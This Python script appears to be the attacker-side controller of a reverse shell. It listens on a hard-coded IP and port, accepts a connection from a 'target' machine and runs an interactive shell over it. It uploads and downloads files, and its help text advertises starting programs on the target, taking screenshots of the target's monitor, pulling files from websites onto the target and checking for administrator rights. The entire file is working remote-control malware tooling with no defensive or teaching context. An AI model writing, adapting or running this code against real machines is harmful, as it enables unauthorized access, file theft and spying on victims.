import socket
import json
import os
import termcolor
from termcolor import colored


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def shell():
    count = 0
    while True:
        command = input('* Shell#~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])

        elif command == 'help':
            print (termcolor.colored('''\n                        download path -> Download A file From Target PC
			upload path   -> Upload A file To Target PC
			get url       -> Download File To Target From Any Website
			start path    -> Start Program on Target PC
			screenshot    -> Take A Screenshot of Targets Monitor
			check         -> Check For Administrator Privileges 
			quit           -> Exit The Reverse_Shell ''', 'green'))
        else:
            result = reliable_recv()
            print(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('192.168.194.118', 54321))
print(termcolor.colored('[+] Listening For The Incoming Connections', 'blue'))
s.listen(5)
target, ip = s.accept()
print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'red'))
shell()
